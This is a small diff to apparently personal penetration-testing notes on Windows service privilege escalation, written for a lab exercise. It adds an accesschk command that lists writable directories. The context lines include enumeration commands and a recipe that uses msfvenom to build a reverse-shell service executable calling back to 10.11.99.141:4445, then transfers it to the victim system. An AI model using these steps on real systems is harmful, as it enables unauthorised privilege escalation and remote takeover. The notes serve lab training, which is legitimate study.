@@ -164,6 +164,7 @@ sc qc <service name> # Check the configuration details
 
 icacls WService.exe # Check Permission Service File exe
 accesschk64.exe -qlc thmservice # Checking the service permission 
+accesschk64.exe /accepteula -uwdq "C:\"
 
 Get-SmbServerConfiguration # Check the SMB version running on a Windows system (in the internal network)
 ----------------------------------------------------------------
@@ -188,7 +189,7 @@ reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WindowsScheduler 
 sc qc WindowsScheduler # cmd
 sc.exe qc WindowsScheduler # powershell
 2️⃣ # Check Permission Service File
-icacls C:\PROGRA~2\SYSTEM~1\WService.exe 
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe
 3️⃣ # Making a malicious Payload with MSFvenom:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.99.141 LPORT=4445 -f exe-service -o rev-svc.exe
 4️⃣ # Transfer of malicious file to the victim system
